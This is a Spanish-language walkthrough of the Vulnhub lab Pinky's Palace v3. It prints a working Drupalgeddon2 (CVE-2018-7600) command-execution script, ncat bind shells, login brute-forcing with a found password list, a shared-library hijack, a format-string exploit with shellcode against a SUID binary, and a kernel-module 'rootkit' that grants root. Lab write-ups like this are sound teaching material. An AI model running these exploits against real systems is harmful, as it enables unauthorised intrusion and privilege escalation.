---
title: Pinkys Palace v3 - Vulnhub
layout: post
permalink: /writeups/vulnhub/pinkyspalacev3
date: 2025-04-06 11:00:00 -0000
categories: [Laboratorios]
tags: [Vulnhub]
description: >
  Write up en español para Pinkys Palace v3 - Vulnhub
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
nmap -sT -Pn -T4 -O 192.168.100.99
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 11:02 CEST
Nmap scan report for 192.168.100.99
Host is up (0.00040s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
5555/tcp open  freeciv
8000/tcp open  http-alt
MAC Address: BC:24:11:3A:A1:D6 (Proxmox Server Solutions GmbH)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 1 hop
```
## Puerto 21

Se trata el puerto de FTP anónimo.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-4.png)

Lo primero que veremos es un mensaje de bienvenida pero explorando un poco más encontraremos una configuración interesante sobre el firewall.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-7.png)

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-5.png)

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-8.png)

Este firewall parece bloquear todas las conexiones TCP salientes iniciadas desde eth0, es decir, ninguna conexión nueva puede salir del sistema por TCP.

Esto significa que no podremos obtener una shell reversa en principio.

## Puerto 5555

Es el puerto dedicado al servicio SSH.

```bash
❯ nc 192.168.100.99 5555
SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
```

## Puerto 8000

Nos encontramos ante un CMS basado en Drupal 7.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image.png)

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-1.png)

Un escaneo rápido de diretorios nos muestra bastante información interesante.

```bash
gobuster dir -u http://192.168.100.99:8000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.99:8000/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 169]
/.hta                 (Status: 403) [Size: 169]
/.htpasswd            (Status: 403) [Size: 169]
/.gitignore           (Status: 200) [Size: 174]
/includes             (Status: 301) [Size: 185] [--> http://192.168.100.99:8000/includes/]
/index.php            (Status: 200) [Size: 9196]
/misc                 (Status: 301) [Size: 185] [--> http://192.168.100.99:8000/misc/]
/modules              (Status: 301) [Size: 185] [--> http://192.168.100.99:8000/modules/]
/profiles             (Status: 301) [Size: 185] [--> http://192.168.100.99:8000/profiles/]
/rest                 (Status: 301) [Size: 185] [--> http://192.168.100.99:8000/rest/]
/scripts              (Status: 301) [Size: 185] [--> http://192.168.100.99:8000/scripts/]
/robots.txt           (Status: 200) [Size: 2189]
/sites                (Status: 301) [Size: 185] [--> http://192.168.100.99:8000/sites/]
/themes               (Status: 301) [Size: 185] [--> http://192.168.100.99:8000/themes/]
/web.config           (Status: 200) [Size: 2200]
Progress: 4744 / 4745 (99.98%)
/xmlrpc.php           (Status: 200) [Size: 42]
===============================================================
Finished
===============================================================
```

En el robots.txt encontramos aun más información interesante.

```plaintext
#
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html

User-agent: *
Crawl-delay: 10
# CSS, JS, Images
Allow: /misc/*.css$
Allow: /misc/*.css?
Allow: /misc/*.js$
Allow: /misc/*.js?
Allow: /misc/*.gif
Allow: /misc/*.jpg
Allow: /misc/*.jpeg
Allow: /misc/*.png
Allow: /modules/*.css$
Allow: /modules/*.css?
Allow: /modules/*.js$
Allow: /modules/*.js?
Allow: /modules/*.gif
Allow: /modules/*.jpg
Allow: /modules/*.jpeg
Allow: /modules/*.png
Allow: /profiles/*.css$
Allow: /profiles/*.css?
Allow: /profiles/*.js$
Allow: /profiles/*.js?
Allow: /profiles/*.gif
Allow: /profiles/*.jpg
Allow: /profiles/*.jpeg
Allow: /profiles/*.png
Allow: /themes/*.css$
Allow: /themes/*.css?
Allow: /themes/*.js$
Allow: /themes/*.js?
Allow: /themes/*.gif
Allow: /themes/*.jpg
Allow: /themes/*.jpeg
Allow: /themes/*.png
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

Podemos verificar exactamente que versión de Drupal está usando consultando el CHANGELOG.txt.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-2.png)

Versión 7.57.

Los demás archivos son readme por defecto que proporciona Drupal para tener una idea de como mantener el CMS aunque otros como install/upgrade.php son interesantes pero no tenemos acceso a ellos.

## CVE-2018-7600

En esta versión de Drupal 7.57 es bien conocida la vulnerabilidad CVE-2018-7600 que permite ejecutar código arbitrario en el servidor debido a malas configuraciones en ciertos módulos por defecto llamada [Drupalgeddon](https://nvd.nist.gov/vuln/detail/CVE-2018-7600).

Aunque existen difernetes PoC para este CVE escogí uno sencillo aunque antiguo para modificarlo y hacerlo funcionar correctamente ya que no podremos obtener una shell reversa crearemos una shell semi interactiva.

[Script original](https://github.com/lorddemon/drupalgeddon2/blob/master/drupalgeddon2.py)

Script modificado:

{% raw %}
```python
#!/usr/bin/env python3
# coding: utf-8

import requests
import re
import sys
import os

def exploit(url_target, os_command):
    # Paso 1: Inyección en user/password
    params = {
        'q': 'user/password',
        'name[#post_render][]': 'passthru',
        'name[#markup]': os_command,
        'name[#type]': 'markup'
    }
    data = {
        'form_id': 'user_pass',
        '_triggering_element_name': 'name'
    }

    try:
        r = requests.post(url_target, data=data, params=params, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"[!] Error de conexión: {e}")
        return

    match = re.search(r'name="form_build_id" value="([^"]+)"', r.text)
    if not match:
        print("[!] No se pudo extraer el form_build_id.")
        return

    form_build_id = match.group(1)

    # Paso 2: Ejecutar comando
    params = {'q': f'file/ajax/name/#value/{form_build_id}'}
    data = {'form_build_id': form_build_id}

    try:
        r = requests.post(url_target, data=data, params=params, timeout=10)
        r.encoding = 'utf-8'
        output = r.text.split("[{")[0].strip()
        print(output if output else "[*] Comando ejecutado pero sin salida.")
    except Exception as e:
        print(f"[!] Error al ejecutar el comando: {e}")

def shell(url_target):
    print(f"\n[*] Shell interactiva sobre {url_target}")
    print("    Escribí 'exit' para salir.\n")
    while True:
        try:
            cmd = input("drupal-shell$ ")
            if cmd.strip().lower() in ['exit', 'quit']:
                print("[*] Cerrando sesión interactiva.")
                break
            if cmd.strip() == "":
                continue
            exploit(url_target, cmd)
        except KeyboardInterrupt:
            print("\n[*] Salida por usuario.")
            break

def usage():
    print("\nUso: python3 drupalgeddon2.py <URL>")
    print("Ejemplo: python3 drupalgeddon2.py http://192.168.100.220:8000\n")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        usage()
        sys.exit(1)

    target_url = sys.argv[1]
    shell(target_url)
```
{% endraw %}

Este script lo guardamos y ejecutamos una prueba.

![alt text](image-3.png)

Ahora que podemos explorar el sistema de forma más o menos interactiva podemos buscar alternativas de tunneling para obtener una shell reversa.

## Bind shell

Este concepto que se conoce como bind shell es una forma de obtener una shell reversa en el sistema. Si una shell reversa se basa en la conexión desde la víctima hacia un puerto del C2C, **bind shell** es lo contrario, el C2C se conecta a un puerto abierto en el sistema objetivo.

Para conseguir esto vamos a necesitar que en la víctima exista alguna herramienta que nos permita crear un puerto abierto con ciertas características.

Podemos empezar buscando herramientas como Netcat o Socat.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-6.png)

Parece que ncat está instalado en la máquina.

Ahora el proceso es abrir el puerto en la víctima indicando que sirva bash y conectarse a él.

```bash
ncat -lvnp 1337 -e /bin/bash
```

- l: listen (escucha conexiones entrantes)

- v: modo verbose

- n: no hace DNS lookups

- p 1337: puerto a usar

- e /bin/bash: ejecuta bash cuando alguien se conecta

Ahora conectamos con el bind shell.

```bash
nc 192.168.100.99 1337
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-9.png)

Ahora podemos estabilizar la shell.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-10.png)

## Explorando el sistema

- Usuarios del sistema con shell

```bash
www-data@pinkys-palace:~/html$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
pinksec:x:1001:1001::/home/pinksec:/bin/bash
pinksecmanagement:x:1002:1002::/home/pinksecmanagement:/bin/bash
```

- Servicios expuestos

```bash
netstat -tulnp
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-11.png)

Hay servicios internos escuchando en:

- 127.0.0.1:80 → probablemente Apache

- 127.0.0.1:3306 → MySQL

- 127.0.0.1:65334 → ¿otro web service?

Como no tenemos acceso ssh pero si disponemos de ncat vamos a realizar un port forwarding para acceder a estos servicios.

### Port forwarding

ncat puede hacer forwarding TCP con una simple redirección.

- Redirigir puerto 80 interno → 4444 externo

```bash
nohup ncat -lvp 4444 -c "ncat 127.0.0.1 80" &
# o
socat TCP-LISTEN:4444,reuseaddr,fork TCP:127.0.0.1:80

```

Esto dice:

“Escucha en el 4444 y redirige todo lo que llegue al 127.0.0.1:80”.

- Redirigir puerto 65334 interno → 4445 externo

```bash
nohup ncat -lvp 4445 -c "ncat 127.0.0.1 65334" &
# o
socat TCP-LISTEN:4445,reuseaddr,fork TCP:127.0.0.1:65334
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-12.png)

- En el puerto local 65334 encontramos una base de datos que parece en development.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-13.png)

- En el puerto local 80 encontramos un panel de administración interno.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-14.png)

### Fuzzing de archivos

En el puerto 4445 donde encontramos la base de datos en desarrollo realizamos un fuzzing para encontrar posibles ficheros con datos sensibles.

- Creamos dos diccionarios de palabras clave

```bash
# ext.txt
mdb
sql
txt
db
lst
```

```bash
crunch 1 4 abcdefghijklmnopqrstuvwxyz1234567890 > /tmp/words.txt
```

Con esto haremos el fuzzing.

```bash
wfuzz -t 100 -w /tmp/words.txt -w /tmp/ext.txt --sc=200 -c http://192.168.100.99:4445/FUZZ.FUZ2Z
```

Tras un buen rato parece haber encontrado un archivo llamdo `pwds.db`.

```plaintext
FJ(J#J(R#J
JIOJoiejwo
JF()#)PJWEOFJ
Jewjfwej
jvmr9e
uje9fu
wjffkowko
ewufweju
pinkyspass
consoleadmin
administrator
admin
P1nK135Pass
AaPinkSecaAdmin4467
password4P1nky
Bbpinksecadmin9987
pinkysconsoleadmin
pinksec133754
```

## Brute force de usuarios

Ahora que tenemos una lista de contraseñas podemos usarla junto con los nombres de usaurio que existen en el sistema para realizar un brute force en el panel interno.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-15.png)

```bash
wfuzz -t 150 -w users -w passwd -c -d "user=FUZZ&pass=FUZ2Z&pin=11111" http://192.168.100.99:4444/login.php
```

Econtramos entre todas las respuestas una cuya longitud es menor a las demas 41 en lugar de 45.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-16.png)

Esto puede indicar que el usuario y la contraseña son válidos pero el pin no es correcto.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-17.png)

Es algo sutil pero por algún sitio tendremos que continuar por lo que ahora debemos buscar un pin válido.

- Creamos el diccionario de pines

```bash
crunch 5 5 1234567890 > /tmp/pins
```

Lo usamos con las credenciales encontradas anteriormente.

```bash
wfuzz -t 150 -w /tmp/pins -c -d "user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ" --hh 41,45  http://192.168.100.99:4444/login.php
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-18.png)

## Escalando privilegios como usuario

Encontramos aquí un panel de mantenimiento donde podemos ejecutar comandos como el usuario pinksec.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-19.png)

Vamos a crear una bind shell para conectarnos a él.

```bash
ncat -lvnp 1338 -e /bin/bash
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-20.png)

En el directorio del usuario encontramos un binario interesante.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-21.png)

Pertenece a `pinksecmanagement`.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-22.png)

Si hacemos un strings del binario encontramos que utiliza una librería personalizada que es accesible por nuestro usuario y podemos modificarla.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-23.png)

Aunque pertenece a root podemos ver que tenemos permisos de escritura.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-24.png)

Antes de modificar la librería primero debemos saber que es .so es decir se carga en tiempo de ejecución. Otra cosa a tener en cuenta es no dañar funciones críticas para que el binario funcione correctamente y poder obtener el resultado deseado. 

Para esto vamos a utilizar el comando `nm -g`que nos permite listar las funciones de la librería.

```bash
nm -g /lib/libpinksec.so
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-25.png)

Parece que cuenta con un banner, esto es ideal porque no suele ser algo crítico para el funcionamiento del binario y podemos sobreescribirlo.

- Creamos un archivo llamado shell.c

```c
#include <stdlib.h>

int psbanner() {
    return system("/bin/sh");
}
```

```bash
nano shell.c
gcc -shared -o libpinksec.so -fPIC l.cll
cp libpinksec.so /lib/libpinksec.so
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-26.png)

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-27.png)

### Acceso por SSH

La shell que conseguimos es poco interactiva y muy limitada por lo que vamos a crear claves RSA para conectar a través de SSH.

- Creamos las claves

```bash
ssh-keygen -t rsa -b 2048 -f pinksec_key
```

- Copiamos las claves al directorio del usuario

```bash
mkdir /home/pinksecmanagement/.ssh/
echo "PEGA_TU_CLAVE_PÚBLICA_AQUÍ" >> /home/pinksecmanagement/.ssh/authorized_keys
```

Ahora podemos acceder desde a través del puerto 5555.

```bash
ssh -i pinksec_key pinksecmanagement@192.168.100.99 -p 5555
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-28.png)

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-29.png) 

## Escalando privilegios 2

Buscamos binarios que no sean nativos y que tengan el bite SUID activo.

```bash
find / -perm -4000 -type f 2>/dev/null
```

```bash
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/local/bin/PSMCCLI
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/bin/umount
/bin/su
/bin/ping
/bin/mount
```

El que nos interesa es el binario `PSMCCLI` ya que posiblemente sea algo como **pinkManager Console**.

El binario parece que únicamente escribe los parámetros que se le pasen.

```bash
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI 
[+] Pink Sec Management Console CLI
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI test
[+] Args: test
``` 

Para poder analizar bien el binario vamos a utilizar `gdb` por lo que primero debemos descargar el binario a nuestra máquina.

```bash
pinksecmanagement@pinkys-palace:/usr/local/bin$ python3 -m http.server 10000
Serving HTTP on 0.0.0.0 port 10000 ...
192.168.100.210 - - [06/Apr/2025 05:31:08] "GET /PSMCCLI HTTP/1.1" 200 -
```

```bash
wget http://192.168.100.99:10000/PSMCCLI
```

Buscamos la función donde el binario muestra el argumento del usuario.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-30.png)

Observamos que usa las funciones `printf` para mostrar el mensaje.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-31.png)

Estas pueden ser o suelen ser vulnerables a  **format string**. Es una vulnerabilidad clásica.
Es cuando un programa hace algo como:

```c
printf(user_input);  // ❌ VULNERABLE
```

En lugar de:

```c
printf("%s", user_input);  // ✅ SEGURO
```

> Cuando el programa **pasa el input directamente como formato**, el atacante puede controlar **cómo se imprime**, acceder a la memoria e incluso **escribir valores arbitrarios en memoria**.
{. prompt-warning }

Si pasamos el argumento `%x` muestra valores de la pila.

```bash
pinksecmanagement@pinkys-palace:/usr/local/bin$ /usr/local/bin/PSMCCLI %x
[+] Args: bffff704
```

### Explotando el format string

- Shellcode

[Fuente](http://shell-storm.org/shellcode/files/shellcode-827.php)

```bash
export SCODE=$(echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
```

- Encontrar la dirección en memoria de esa variable de entorno

Utilizamos [getenvaddr.c](https://raw.githubusercontent.com/Partyschaum/haxe/master/getenvaddr.c)

```bash
gcc getenvaddr.c -o getenvaddr
chmod +x getenvaddr
```

#### Recolección de datos

- Determinar direcciones

```bash
# Se ha colocado en la variable de entorno y se verificó su dirección
pinksecmanagement@pinkys-palace:/tmp$ export SCODE=$(echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
pinksecmanagement@pinkys-palace:/tmp$ ./getenvaddr SCODE /usr/local/bin/PSMCCLI
SCODE will be at 0xbffffe4b

# Dirección de la función a sobreescribir (puntero en la GOT de putchar)
pinksecmanagement@pinkys-palace:/tmp$ objdump -R /usr/local/bin/PSMCCLI | grep putchar 
0804a01c R_386_JUMP_SLOT   putchar@GLIBC_2.0
```

- Determinar el offset en la pila

```bash
# Offset en la pila (determinación con marcadores)
#Ejemplo bueno tenemos los valores ASCII de A y B exactos
/usr/local/bin/PSMCCLI AAAABBBB%134\$x%135\$x
[+] Args: AAAABBBB4141414142424242

# En caso de los valores ASCII de A y B no coincidan, debemos ajustar el offset mediante padding
/usr/local/bin/PSMCCLI AAAABBBBC%134\$x%135\$x
[+] Args: AAAABBBBC4241414143424242

# En este caso no es necesario hacer padding
```

| Stack offset | Contenido           | Interpreta `printf` como      |
|--------------|---------------------|-------------------------------|
| 134          | 0x41414141 ("AAAA") | `%134$x` → muestra `41414141` |
| 135          | 0x42424242 ("BBBB") | `%135$x` → muestra `42424242` |

Esto confirma que los primeros 8 bytes del input (donde pondremos las direcciones a sobreescribir) están en esas posiciones, por lo que ahora podemos usar `%134$hn` y `%135$hn` para escribir valores a esas direcciones.

#### Creando el payload

El objetivo es sobrescribir la entrada en la GOT de `putchar` (0x0804a01c) con la dirección donde hemos colocado la shellcode en la pila.

Esto provoca que cuando se llame a `putchar()` en lugar de ir a la función de libc, irá a la dirección en memoria de nuestro shellcode.

- Calcular la división de la dirección del shellcode

Necesitamos dividir la dirección del shellcode en dos partes:

    Parte alta: 0xfe4b
    Parte baja: 0xbfff

Calculamos los rellenos sabiendo que las direcciones están en offset 134 y 135.
Como no usamos padding solo restamos 8 carácteres impresos antes del primer %u, en el caso de haber padding añadimos 1 carácter a la resta.

```plaintext
fill_low = 65099 - 8 = 65091
# Como 0xbfff es menor que 0xfe4b debemos hacer un overflow entonces
fill_high = 0x1bfff (114687) - 0xfe4b (65099) = 49588
```

- Construir el payload

```bash
/usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")%65091u%134\$hn%49588u%135\$hn
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-32.png)

#### Explicación

- **Direcciones: `\x1c\xa0\x04\x08\x1e\xa0\x04\x08`**

Estas son **dos direcciones escritas en little endian**, que colocamos como los **primeros 8 bytes del input**. Vamos a analizarlas:

- `\x1c\xa0\x04\x08` → esto es `0x0804a01c`  
- `\x1e\xa0\x04\x08` → esto es `0x0804a01e` (es decir, `0x0804a01c + 2`)

##### ¿Qué es esta dirección?

- Es la dirección **en la GOT** (Global Offset Table) de la función `putchar`.  
- El binario vulnerable **llama a `putchar()`**, así que si podemos **sobrescribir su GOT**, la ejecución se redirige a lo que queramos.

##### ¿Por qué hay dos direcciones?

Porque vamos a sobrescribir **una dirección completa de 32 bits**, pero el **format string exploit con `%hn` solo escribe 2 bytes (16 bits)**.

Así que:

- Esccribimos la **parte baja** (los primeros 2 bytes) en `0x0804a01c`
- Y la **parte alta** (los otros 2 bytes) en `0x0804a01e`


##### **Rellenos: `%65091u` y `%49588u`**

Estas directivas le dicen a `printf()` que **imprima X caracteres antes de hacer el write con `%hn`**.

Esto es clave porque:

> **`%hn` escribe la cantidad de caracteres impresos hasta ese momento en la dirección dada**.

##### ¿Qué queremos escribir?

Queremos escribir una dirección como `0xbffffe4b` (ejemplo), que dividimos en:

- Parte baja: `0xfe4b` → **decimal 65099**
- Parte alta: `0xbfff` → **decimal 49151**

Entonces, para que `%134$hn` escriba `0xfe4b` en `0x0804a01c`, necesitamos que `printf()` **haya impreso 65099 caracteres** cuando llegue ahí.

Pero como ya imprimimos 8 caracteres antes (las dos direcciones):

- **65099 - 8 = 65091 →** usas `%65091u`

Lo importante es:
- `%65091u` → hace que `printf()` imprima 65091 caracteres  
- Luego `%134$hn` → escribe 65091 (0xfe43) en la dirección `0x0804a01c`

**Lo mismo para la parte alta con `%49588u`**:  
Es la diferencia entre la parte alta ajustada con overflow y la parte baja.

##### **Los `%134$hn` y `%135$hn`**

Estas son las **instrucciones finales que hacen la escritura real**:

- `%134$hn` → escribe 65091 (0xfe43) en la dirección que colocaste al inicio del payload: `0x0804a01c`
- `%135$hn` → escribe 49588 (0xc1b4) en `0x0804a01e`

Así, entre las dos:
- **sobrescribes 4 bytes consecutivos en la GOT** (2 con cada `%hn`)
- La GOT de `putchar` termina apuntando al **shellcode en la pila** 

## Escalando privilegios 3

Ahora que tenemos shell como `pinky` creamos una nueva RSA key para acceso por ssh.

```bash
ssh-keygen -t rsa -b 2048 -f pinky_key
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-33.png)

La pegamos igual que antes pero ahora en el usuario `pinky`.

```bash
mkdir /home/pinky/.ssh/
echo "PEGA_TU_CLAVE_PÚBLICA_AQUÍ" >> /home/pinky/.ssh/authorized_keys
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-34.png)

Ahora si con un sudo -l encontramos:

```bash
pinky@pinkys-palace:~$ sudo -l
Matching Defaults entries for pinky on pinkys-palace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pinky may run the following commands on pinkys-palace:
    (ALL) NOPASSWD: /sbin/insmod
    (ALL) NOPASSWD: /sbin/rmmod
```

Este usuario tiene permisos sudo sobre dos binarios que son utilidades del sistema que permiten instalar modulos de kernel y eliminarlos.

Podemos usar un rootkit existente o crear un modulo sencillo para escalar a UID 0.

En este caso la victima si tenía los headers necesarios para compilar pero si no fuese el caso tendríamos que buscar un rootkit con la versión de kernel que tenga comprobando con `uname -r`.

- Código del rootkit.c

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yo");
MODULE_DESCRIPTION("Rootkit sencillo para abrir reverse shell como root");

static int __init rootkit_init(void)
{
    printk(KERN_INFO "[rootkit] Cargando el módulo...\n");

    // 1. Elevar privilegios al proceso que ejecuta insmod
    commit_creds(prepare_kernel_cred(NULL));

    // 2. Definir comando para la reverse shell
    // Sustituye TU_IP y PUERTO por tu IP atacante y puerto
    char *argv[] = {
        "/bin/bash",
        "-c",
        "ncat -lvnp 8888 -e /bin/bash",
        NULL
    };
    // Entorno mínimo
    static char *envp[] = {
        "HOME=/root",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };

    // 3. Llamar a usermodehelper
    // UMH_WAIT_EXEC = esperamos a que termine la ejecución
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk(KERN_INFO "[rootkit] call_usermodehelper: %d\n", ret);

    return 0;
}

static void __exit rootkit_exit(void)
{
    printk(KERN_INFO "[rootkit] Módulo descargado.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

```

- Código del Makefile

```makefile
obj-m += rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

- Compilamos el módulo

```bash
make
```

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-35.png)

- Instalamos el módulo

```bash
sudo insmod rootkit.ko
```

Este módulo ejecutará una bind shell en el puerto 8888 ya que si recordamos no podemos realizar una shell reversa en el sistema debido al firewall.

![alt text](/assets/img/writeups/vulnhub/pinkyspalacev3/image-36.png)
